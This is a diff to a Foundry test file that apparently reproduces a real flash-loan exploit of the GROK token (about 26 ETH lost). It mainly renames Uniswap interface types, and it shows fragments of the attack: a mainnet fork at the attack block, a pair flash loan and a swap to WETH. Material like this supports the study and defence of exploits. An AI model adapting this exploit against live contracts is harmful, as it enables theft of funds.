@@ -2,7 +2,6 @@
 pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
-import "./../interface.sol";
 
 // @KeyInfo - Total Lost : ~26 ETH
 // Attacker : https://etherscan.io/address/0x864e656c57a5a119f332c47326a35422294db5c9
@@ -15,18 +14,16 @@ import "./../interface.sol";
 
 contract ContractTest is Test {
 
-    Uni_Router_V2 router_v2 = Uni_Router_V2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
-    Uni_Router_V3 router_v3 = Uni_Router_V3(0xE592427A0AEce92De3Edee1F18E0157C05861564);
+    IUniswapV2Router router_v2 = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
+    IUniswapV3Router router_v3 = IUniswapV3Router(0xE592427A0AEce92De3Edee1F18E0157C05861564);
     IERC20 grok = IERC20(0x8390a1DA07E376ef7aDd4Be859BA74Fb83aA02D5);
     IERC20 weth = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
-    Uni_Pair_V3 wethpair = Uni_Pair_V3(0x109830a1AAaD605BbF02a9dFA7B0B92EC2FB7dAa);
-    Uni_Pair_V3 pair = Uni_Pair_V3(0x66bA59cBD09E75B209D1D7E8Cf97f4Ab34DA413B);
-
-    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
+    IUniswapV3Pair wethpair = IUniswapV3Pair(0x109830a1AAaD605BbF02a9dFA7B0B92EC2FB7dAa);
+    IUniswapV3Pair pair = IUniswapV3Pair(0x66bA59cBD09E75B209D1D7E8Cf97f4Ab34DA413B);
 
     function setUp() public {
         vm.createSelectFork("mainnet", 18_538_679 - 1);
-        cheats.label(address(weth), "WETH");
+        vm.label(address(weth), "WETH");
     }
 
     function testExpolit() public {
@@ -40,7 +37,7 @@ contract ContractTest is Test {
             pair.flash(address(this), 63_433_590_767_572_373, 0, new bytes(1));
             grok.approve(address(router_v3), grok.balanceOf(address(this)));
             router_v3.exactInputSingle(
-                Uni_Router_V3.ExactInputSingleParams({
+                IUniswapV3Router.ExactInputSingleParams({
                     tokenIn: address(grok),
                     tokenOut: address(weth),
                     fee: 10_000,
